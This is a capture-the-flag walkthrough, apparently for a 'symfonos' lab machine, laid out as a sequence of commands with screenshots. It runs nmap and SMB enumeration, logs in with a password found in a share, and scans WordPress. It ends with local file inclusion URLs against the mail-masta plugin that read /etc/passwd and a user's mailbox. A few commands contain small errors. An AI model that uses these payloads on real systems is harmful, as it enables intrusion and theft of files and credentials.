<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/88e1fe29-f852-456c-8f61-f7e5fb362ae6"></picture></h1>

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1>

```bash
arp-scan -I eth0 --localnet --ignoredups
```
![image](https://github.com/user-attachments/assets/78f2f130-3cff-4270-bb2f-ff47be4a0ec7)

```bash
ping -c 1 192.168.1.206
```
![image](https://github.com/user-attachments/assets/11082534-d4e5-46a4-bd1d-5dcb3739a9cf)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.206 -oG allPorts
```
![image](https://github.com/user-attachments/assets/aed9999a-d126-4a95-87ca-2191569d542e)

```bash
nmap -sCV -p22,25,80,139,445 192.168.1.206 -oN targeted
```
![image](https://github.com/user-attachments/assets/3fe2fe44-709f-4d84-8e57-2855140ee130)

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1>

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>

![image](https://github.com/user-attachments/assets/a17e1705-6473-414e-84c7-0a0c9614be6c)<br>
```CTRL + U```<br>
<br>
![image](https://github.com/user-attachments/assets/eee9fbf0-4fdb-4738-b9fb-8561882bc05d)

```bash
whatweb "http://192.168.1.206"
```
![image](https://github.com/user-attachments/assets/d3d9975f-ef95-4a56-ac5a-5b19837293d8)

#### **let's analyze the image we found above**
![image](https://github.com/user-attachments/assets/337c0441-58c3-4b1b-a9cc-6f584b191796)<br>
![image](https://github.com/user-attachments/assets/12484bcf-49f2-4406-9d34-7745fdc4b601)
```bash
wget http://192.168.1.206/image.jpg
```
![image](https://github.com/user-attachments/assets/a9bfcf71-aeba-4659-ab77-b162891dd820)
```bash
exiftool image.jpg
```
![image](https://github.com/user-attachments/assets/f9aa1464-dcf7-45bc-acd4-d02bd04fe942)

### **Fuzzing**
```bash
gobuster dir -u http://192.168.1.206/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/a548b799-c922-4c44-9f0d-2ce19fbcc161)
![image](https://github.com/user-attachments/assets/a9a82b2c-5d83-464a-92e1-181c5fa2a7b3)

#### **We have not found anything that can help us at the moment**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 445</h2>

```bash
smbmap -H 192.168.1.206
```
![image](https://github.com/user-attachments/assets/b66eba20-6e05-4740-b388-9d00a3f22b76)

```bash
smbmap -H 192.168.1.206 -r anonymous
```
![image](https://github.com/user-attachments/assets/02ed6711-5430-4525-b475-77f270c22ec7)

```bash
smbmap -H 192.168.1.206 --download anonymous/attention.txt
```
![image](https://github.com/user-attachments/assets/316386e3-3343-4c0e-9337-322771037ce9)
![image](https://github.com/user-attachments/assets/4c420a34-3da4-4af0-8ff3-0e6468c006e9)

#### **possible passwords and users**
```bash
nano users.txt

helios
Zeus
```
```bash
nano passwords.txt

epidioko
qwerty
baseball
```
![image](https://github.com/user-attachments/assets/16f07265-13d5-4e1a-ba44-9f33f1212edb)<br>

#### **let's remember that we still have a helios user share that we don't have access to so let's try the passwords found**
```bash
smbmap -H 192.168.1.206 -u helios -p qwerty
```
![image](https://github.com/user-attachments/assets/77400a11-9d41-4ef4-8847-5efe753f56bf)

```bash
smbmap -H 192.168.1.206 -u helios -p qwerty -r helios
```
![image](https://github.com/user-attachments/assets/5da48e91-22f9-44b2-b364-21bff7fde9e7)

```bash
smbmap -H 192.168.1.206 -u helios -p qwerty --download helios/research.txt
smbmap -H 192.168.1.206 -u helios -p qwerty --download helios/todo.txt
```
![image](https://github.com/user-attachments/assets/26d40dfe-9a33-43af-bd7d-e83b7f846a1e)
![image](https://github.com/user-attachments/assets/4ee92ecd-2005-49a1-be49-dbec846c6dd0)
![image](https://github.com/user-attachments/assets/1435e5d8-5ec6-4bbc-b09b-b568321b1648)
![image](https://github.com/user-attachments/assets/a97e2fa8-4867-4bb6-b53d-85561e73515a)
<br>
<br>
``CTRL + U``
<br>
<br>
![image](https://github.com/user-attachments/assets/a7fb8009-44b5-4068-9efc-8e4bc496abd6)

```bash
ping -c 1 http://symfonos.local/
```
![image](https://github.com/user-attachments/assets/303a0a02-448a-470d-ad27-3b19f5dd03db)
```bash
nano /etc/hosts/
```
![image](https://github.com/user-attachments/assets/22984232-e1a9-4ba8-bd67-1349f5714bd3)
![image](https://github.com/user-attachments/assets/8fe11ba1-788c-4e5a-aeb1-dbbae8c4f267)

```bash
whatweb "http://192.168.1.206/h3l105/"
```
![image](https://github.com/user-attachments/assets/57f2da01-d568-4bae-a778-bb65dce31a9b)

### **Fuzzing**
```bash
gobuster dir -u http://192.168.1.206/h3l105/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,py,php,sh
```
![image](https://github.com/user-attachments/assets/5080b808-1a03-4fdd-ac98-a5005769976e)


#### **we apply a word press recognition**
```bash
wpscan --url http://192.168.1.206/h3l105/ --enumerate u,vp
```
![image](https://github.com/user-attachments/assets/71a8e804-5bc2-465a-a273-2c679e15acdc)
![image](https://github.com/user-attachments/assets/4029f662-4962-48ce-a0a8-d3c8ae1b8872)
![image](https://github.com/user-attachments/assets/08fed5f8-d0c7-4ec3-bc13-1856e18259b4)

#### **we didn't find anything, but let's remember that when reviewing the source code of the web site we could see some plugins**
![image](https://github.com/user-attachments/assets/85f2eade-4728-42a4-82b5-f94825b4aa67)

#### **now from the console we will make a call to the web to make an analysis and we can extract more info.**
```bash
curl -s -X GET "http://192.168.1.206/h3l105/" | grep "wp-content" |grep -oP "'.*?'" | grep "symfonos.local" | cut -d '/' -f 1-7 | sort -u | grep plugins
```
![image](https://github.com/user-attachments/assets/e112d048-8406-4dc8-94ac-d5625cff123d)

#### **we look for possible exploits**
```bash
searchsploit mail masta
```
![image](https://github.com/user-attachments/assets/07d78f62-c6af-4322-b7f9-3374c2b38f4a)
```bash
searchxploit -x php/webapps/40290.txt
```
![image](https://github.com/user-attachments/assets/614a157b-3fc7-425c-b946-c2e652ea5cc9)
http://192.168.1.206/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
![image](https://github.com/user-attachments/assets/f75129aa-8b8f-45ca-ab56-bffd87eea826)

#### **as we found a plugin on mails, let's search for e-mails**
```WEB
http://192.168.1.206/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
```
![image](https://github.com/user-attachments/assets/84b33dfc-d780-4c30-8a82-75c6e1dcadbc)
![image](https://github.com/user-attachments/assets/bdd37c8d-0aa0-4f20-ab91-0d646b1a980d)
















